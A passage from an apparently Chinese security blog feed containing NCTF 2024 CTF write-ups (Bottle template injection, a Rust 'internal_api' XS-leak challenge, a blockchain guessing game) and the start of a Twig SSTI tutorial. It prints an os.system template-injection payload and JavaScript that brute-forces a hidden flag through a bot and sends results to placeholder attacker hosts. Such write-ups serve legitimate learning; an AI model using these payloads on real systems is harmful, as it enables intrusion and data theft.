class="keyword">return</span> <span class="string">&quot;yes&quot;</span> <span class="keyword">if</span> setval(name, path, value) <span class="keyword">else</span> <span class="string">&quot;no&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.get(<span class="params"><span class="string">&#x27;/render&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>():</span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.find(<span class="string">&quot;&#123;&quot;</span>)&gt;=<span class="number">0</span> <span class="keyword">or</span> path.find(<span class="string">&quot;&#125;&quot;</span>)&gt;=<span class="number">0</span> <span class="keyword">or</span> path.find(<span class="string">&quot;.&quot;</span>)&gt;=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hacker&quot;</span></span><br><span class="line">    <span class="keyword">return</span> bottle.template(path)</span><br></pre></td></tr></table></figure><p>​这里我们发现，<code>render</code>路由是存在一个模板注入漏洞的，<code>setValue</code>路由可以设置环境变量。对于设置环境变量我没有找到合适的利用方式，因为根据我们分析，如果是通过变量访问的话，需要通过<code>%</code>去访问变量，一开始我没想到这个，后来想到了之后直接就通过<code>getattr</code>，去获取<code>system</code>方法，然后传入参数就可以执行系统命令了。我们构造如下payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="built_in">getattr</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>), <span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;ystem&#x27;</span>)(<span class="string">&#x27;echo $FLAG&gt;&gt;test&#x27;</span>)</span><br></pre></td></tr></table></figure><p>​这样我们就可以利用模板注入漏洞执行系统命令了，记得URL编码一下。</p><p><img src="/img/2024-nctf/image-20250323224108185-1742745223473-7-1742745242081-23.png" alt="image-20250323224108185"></p><p>​然后我们把同目录test文件作为模板文件来读取就能读出flag了。这似乎是个非预期解，预期的利用方式我也想不到。</p><h2 id="internal-api"><a href="#internal-api" class="headerlink" title="internal_api"></a>internal_api</h2><p>​<img src="/img/2024-nctf/image-20250323224415321-1742745223473-8-1742745242081-24.png" alt="image-20250323224415321"></p><p>​进来之后发现是这么搜索页面，旁边有个report URL的功能，我们直接开始分析源码，先分析路由：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">app</span> = Router::<span class="title function_ invoke__">new</span>()</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/&quot;</span>, <span class="title function_ invoke__">get</span>(route::index))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/report&quot;</span>, <span class="title function_ invoke__">post</span>(route::report))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/search&quot;</span>, <span class="title function_ invoke__">get</span>(route::public_search))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/internal/search&quot;</span>, <span class="title function_ invoke__">get</span>(route::private_search))</span><br><span class="line">        .<span class="title function_ invoke__">with_state</span>(Arc::<span class="title function_ invoke__">new</span>(pool));</span><br></pre></td></tr></table></figure><p>​可见这里有4个路由，其中<code>/search</code>就是普通用户的搜索路由，<code>internal/search</code>这个路由我们分析源码可以发现这个路由只能由本地的<code>selenium</code>服务去访问，<code>/report</code>则是向本地的<code>selenium</code>服务添加请求的，我们先分析公共的搜索方法：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">public_search</span>(</span><br><span class="line">    <span class="title function_ invoke__">Query</span>(search): Query&lt;Search&gt;,</span><br><span class="line">    <span class="title function_ invoke__">State</span>(pool): State&lt;Arc&lt;DbPool&gt;&gt;,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;Json&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt;, AppError&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">pool</span> = pool.<span class="title function_ invoke__">clone</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">conn</span> = pool.<span class="title function_ invoke__">get</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span> = db::<span class="title function_ invoke__">search</span>(conn, search.s, <span class="literal">false</span>)?;</span><br><span class="line">    <span class="keyword">if</span> comments.<span class="title function_ invoke__">len</span>() &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(<span class="title function_ invoke__">Json</span>(comments))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(anyhow!(<span class="string">&quot;No comments found&quot;</span>).<span class="title function_ invoke__">into</span>())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这就是一个简单调用search查询数据的方法，再分析私有的搜索方法：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">private_search</span>(</span><br><span class="line">    <span class="title function_ invoke__">Query</span>(search): Query&lt;Search&gt;,</span><br><span class="line">    <span class="title function_ invoke__">State</span>(pool): State&lt;Arc&lt;DbPool&gt;&gt;,</span><br><span class="line">    <span class="title function_ invoke__">ConnectInfo</span>(addr): ConnectInfo&lt;SocketAddr&gt;,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;Json&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt;, AppError&gt; &#123;</span><br><span class="line">    <span class="comment">// 以下两个 if 与题目无关, 你只需要知道: private_search 路由仅有 bot 才能访问</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">bot_ip</span> = tokio::net::<span class="title function_ invoke__">lookup_host</span>(<span class="string">&quot;bot:4444&quot;</span>).<span class="keyword">await</span>?.<span class="title function_ invoke__">next</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">if</span> addr.<span class="title function_ invoke__">ip</span>() != bot_ip.<span class="title function_ invoke__">ip</span>() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">Err</span>(anyhow!(<span class="string">&quot;only bot can access&quot;</span>).<span class="title function_ invoke__">into</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">conn</span> = pool.<span class="title function_ invoke__">get</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span> = db::<span class="title function_ invoke__">search</span>(conn, search.s, <span class="literal">true</span>)?;</span><br><span class="line">    <span class="keyword">if</span> comments.<span class="title function_ invoke__">len</span>() &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(<span class="title function_ invoke__">Json</span>(comments))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(anyhow!(<span class="string">&quot;No comments found&quot;</span>).<span class="title function_ invoke__">into</span>())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​根据注释的描述，这个方法只能由本地的bot也就是<code>selenium</code>访问，其余的和公共的search方法是一样的，再分析report方法：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">report</span>(<span class="title function_ invoke__">Form</span>(report): Form&lt;Report&gt;) <span class="punctuation">-&gt;</span> Json&lt;Value&gt; &#123;</span><br><span class="line">    task::<span class="title function_ invoke__">spawn</span>(<span class="keyword">async</span> <span class="keyword">move</span> &#123; bot::<span class="title function_ invoke__">visit_url</span>(report.url).<span class="keyword">await</span>.<span class="title function_ invoke__">unwrap</span>() &#125;);</span><br><span class="line">    <span class="title function_ invoke__">Json</span>(json!(&#123;</span><br><span class="line">        <span class="string">&quot;message&quot;</span>: <span class="string">&quot;bot will visit the url soon&quot;</span></span><br><span class="line">    &#125;))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​可见这里访问的URL是可以指定的，所以这里是可以利用本地<code>selenium</code>去访问<code>/internal/search</code>这个路由获取到flag。最后我们分析一下search方法：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">search</span>(conn: DbConn, query: <span class="type">String</span>, hidden: <span class="type">bool</span>) <span class="punctuation">-&gt;</span> anyhow::<span class="type">Result</span>&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">stmt</span> =</span><br><span class="line">        conn.<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT content FROM comments WHERE content LIKE ? AND hidden = ?&quot;</span>)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span> = stmt</span><br><span class="line">        .<span class="title function_ invoke__">query_map</span>(params![<span class="built_in">format!</span>(<span class="string">&quot;%&#123;&#125;%&quot;</span>, query), hidden], |row| &#123;</span><br><span class="line">            <span class="title function_ invoke__">Ok</span>(row.<span class="title function_ invoke__">get</span>(<span class="number">0</span>)?)</span><br><span class="line">        &#125;)?</span><br><span class="line">        .collect::&lt;rusqlite::<span class="type">Result</span>&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt;&gt;()?;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(comments)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这里我们分析准备的SQL语句，我们要查询flag那么hidden必须是true，仅有<code>/internal/search</code>可以获取到，所以我们的思路很明朗了就是利用本地的bot去访问对应的路由。但这里就有一个问题，就是bot访问的结果是不会返回给我们的，所以我们就需要通过XSleak去获取数据，大体流程如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[通过 /report 路由创建访问任务] --&gt; B[Bot 访问攻击机]</span><br><span class="line">    B --&gt; C[攻击机利用 CSRF 访问 /internal/search 路由]</span><br><span class="line">    C --&gt; D&#123;访问成功?&#125;</span><br><span class="line">    D --&gt;|是| E[记录成功结果]</span><br><span class="line">    D --&gt;|否| F[记录不成功结果]</span><br><span class="line">    E --&gt; G[多次访问并区分数据包]</span><br><span class="line">    F --&gt; G</span><br><span class="line">    G --&gt; H[爆破出 Flag]</span><br></pre></td></tr></table></figure><p>​</p><p>​思路并不难，但是我卡在了区分成功包和失败包，我已经实验过，可以利用bot来访问攻击机，利用JS外带数据。我最后的脚本是：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var chars = &#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~ &#x27;;</span></span><br><span class="line"><span class="keyword">var</span> chars = <span class="string">&#x27;ha&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> charLen = chars.<span class="property">length</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">ENDPOINT</span> = <span class="string">&quot;http://aim-ip:8000/search?s=&quot;</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);   </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">search</span>(<span class="params">leak, charCounter</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> curChar = chars[charCounter];</span><br><span class="line">    <span class="comment">//Chek if the character is valid</span></span><br><span class="line">    x.<span class="title function_">setAttribute</span>(<span class="string">&quot;src&quot;</span>, <span class="string">&#x27;http://aim-ip:8000/search?s=&#x27;</span> + leak + curChar);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(x);</span><br><span class="line">    leak += curChar;</span><br><span class="line">    <span class="keyword">const</span> iframecount = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;iframe&#x27;</span>).<span class="property">length</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(iframecount);</span><br><span class="line">    <span class="comment">//When the page inside the iframe is loaded</span></span><br><span class="line">    x.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//检查页面中有多少个 iframe，如果有1个或多个，则说明当前枚举的字符是有效的。</span></span><br><span class="line">        <span class="keyword">if</span> (iframecount != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="title function_">fetch</span>(<span class="string">&#x27;http://attack-ip/recorder.php?leak=&#x27;</span> + <span class="built_in">escape</span>(leak), &#123;</span><br><span class="line">                <span class="attr">method</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">                <span class="attr">mode</span>: <span class="string">&quot;no-cors&quot;</span>,</span><br><span class="line">                <span class="attr">credentials</span>: <span class="string">&quot;include&quot;</span></span><br><span class="line">            &#125;);</span><br><span class="line">            leak += curChar</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//search(leak, (charCounter + 1) % chars.length);</span></span><br><span class="line">    &#125;</span><br><span class="line">    x.<span class="property">onerror</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://attack-ip/recorder.php?leak=error&#x27;</span>, &#123;</span><br><span class="line">                <span class="attr">method</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">                <span class="attr">mode</span>: <span class="string">&quot;no-cors&quot;</span>,</span><br><span class="line">                <span class="attr">credentials</span>: <span class="string">&quot;include&quot;</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="comment">//search(leak, (charCounter + 1) % chars.length);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; charLen; i++) &#123;</span><br><span class="line">        <span class="title function_">search</span>(<span class="string">&quot;T&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">exploit</span>();</span><br></pre></td></tr></table></figure><p>​这个JS已经能够实现利用CSRF远程访问目标机了，但是不能正确区分正确包和错误包。</p><h4 id="后续："><a href="#后续：" class="headerlink" title="后续："></a>后续：</h4><p>​根据提供的WP，我改造了一下，得到了下面的payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改后的异步版本</span></span><br><span class="line"><span class="keyword">let</span> flag = <span class="string">&#x27;nctf&#123;&#x27;</span>;</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">checkError</span>(<span class="params">currentFlag</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">`http://127.0.0.1:8000/internal/search?s=<span class="subst">$&#123;currentFlag&#125;</span>`</span>;</span><br><span class="line">    <span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">    script.<span class="property">src</span> = url;</span><br><span class="line">    script.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">fetch</span>(<span class="string">`http://yourwebhook/recorder.php?leak=<span class="subst">$&#123;currentFlag&#125;</span>`</span>)</span><br><span class="line">        .<span class="title function_">finally</span>(<span class="function">() =&gt;</span> <span class="title function_">resolve</span>()); <span class="comment">// 确保请求完成才继续</span></span><br><span class="line">      flag = currentFlag;</span><br><span class="line">    &#125;;</span><br><span class="line">    script.<span class="property">onerror</span> = <span class="function">() =&gt;</span> <span class="title function_">resolve</span>(); <span class="comment">// 错误时也继续流程</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">bruteForce</span>(<span class="params">curdepth</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(curdepth == <span class="number">30</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> charset = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789-&#125;&#x27;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> c <span class="keyword">of</span> charset) &#123;</span><br><span class="line">    <span class="keyword">const</span> newFlag = flag + c;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">checkError</span>(newFlag); <span class="comment">// 等待当前请求完成</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">bruteForce</span>(curdepth+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 执行爆破</span></span><br><span class="line"><span class="title function_">bruteForce</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h2 id="x1guessgame"><a href="#x1guessgame" class="headerlink" title="x1guessgame"></a>x1guessgame</h2><p>​这道题是区块链的题目，我的思路只能得到hash过后的answer，所以也卡住了。</p><p>​请求包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/rpc</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>39.106.16.204:18144</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br></pre></td></tr></table></figure><p>​这里我只列出数据包：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;jsonrpc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span><span class="punctuation">,</span><span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eth_getStorageAt&quot;</span><span class="punctuation">,</span><span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;0x交易hash值&quot;</span><span class="punctuation">,</span><span class="string">&quot;0x0&quot;</span><span class="punctuation">,</span><span class="string">&quot;latest&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>​获取处理结果，提交answer的数据包：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;jsonrpc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span><span class="punctuation">,</span><span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eth_sendTransaction&quot;</span><span class="punctuation">,</span><span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;from&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0x玩家地址&quot;</span><span class="punctuation">,</span><span class="attr">&quot;to&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0x挑战合约地址&quot;</span><span class="punctuation">,</span><span class="attr">&quot;gas&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0x1e8480&quot;</span><span class="punctuation">,</span><span class="attr">&quot;gasPrice&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0x4e3b29200&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;nonce&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0x最新的nonce值&quot;</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0x3ef81c38&quot;</span> + <span class="string">&quot;answer_bytes32_hex&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>​获取answer的hash值：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;jsonrpc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span><span class="punctuation">,</span><span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eth_getStorageAt&quot;</span><span class="punctuation">,</span><span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;0x挑战合约地址&quot;</span><span class="punctuation">,</span><span class="string">&quot;0x0&quot;</span><span class="punctuation">,</span><span class="string">&quot;latest&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>​我的大致攻击流程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">A[通过的第三个数据包获取到answer的hash值] --&gt; B[通过第一个数据包获取最新的nonce值]</span><br><span class="line">B --&gt; C[获取到原始的answer] </span><br><span class="line">C --&gt; D[通过第二个数据包提交原始answer]</span><br></pre></td></tr></table></figure><p>​我就卡在了获取原始answer这里。</p>]]></content>
      
      
      <categories>
          
          <category> CTF比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP模板注入漏洞-Twig篇</title>
      <link href="/2025/03/03/PHPsstiTwig/"/>
      <url>/2025/03/03/PHPsstiTwig/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP常见模板引擎"><a href="#PHP常见模板引擎" class="headerlink" title="PHP常见模板引擎"></a>PHP常见模板引擎</h2><blockquote><p>Twig </p><p>Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。</p><p>Smarty </p><p>Smarty算是一种很老的PHP模板引擎了，非常的经典，使用的比较广泛。  </p><p>Blade </p><p>Blade 是 Laravel 提供的一个既简单又强大的模板引擎。 </p><p>和其他流行的 PHP 模板引擎不一样，Blade 并不限制你在视图中使用原生PHP代码。所有Blade视图文件都将被编译成原生的PHP代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade基本上不会给你的应用增加任何额外负担。</p></blockquote><h2 id="模板引擎payload格式"><a href="#模板引擎payload格式" class="headerlink" title="模板引擎payload格式"></a>模板引擎payload格式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Smarty </span><br><span class="line">&#123;php&#125;echo `id`;&#123;/php&#125; //在smarty 3.X中废弃 </span><br><span class="line">&#123;&#125;</span><br><span class="line">&#123;literal&#125; //PHP5中适用 </span><br><span class="line">&#123;if&#125;&#123;/if&#125; </span><br></pre></td></tr></table></figure><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">Twig </span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="number">2</span>*<span class="number">3</span>&#125;&#125;</span><span class="language-xml"> </span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Blade </span><br><span class="line">&#123;&#123;&#125;&#125; </span><br><span class="line">&#123;!! !!&#125;</span><br></pre></td></tr></table></figure>​在PHP中如果使用了如上所述的模板引擎，在这些模板引擎之中分别利用不同的模板函数进行模板的渲染，如果函数中存在可控参数，那么很大概率会存在SSTI模板注入，下面我们通过介绍上述不同的模板引擎来引出引擎中的SSTI相关函数。<h2 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​Twig是一款灵活、快速、安全的PHP模板引擎。如果你接触过其他基于文本的模板语言，比如 Smarty、Django、或者Jinja，你便能轻松掌握Twig。它坚持PHP的原则，并为模板环境添加了有用的功能，使其同时保持对设计师和开发者友好。</p><p>​Twig由一个灵活的词法分析器和解析器驱动。这使得开发者可以自定义标签和过滤器，并创建自己的DSL。</p><p>​Twig已被用于许多开源项目，比如Symfony, Drupal8, eZPublish,phpBB, Piwik, OroCRM；并且许多框架也支持它，例如Slim, Yii, Laravel, Codeigniter and Kohana。</p><h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3><blockquote><p>注意：该模块以下所有语句测试所用版本均为<strong>Twig 1.16.1</strong>。如若出现语法错误，则可能是版本兼容性问题</p></blockquote><h4 id="变量"><a href="#变量" class="headerlink" 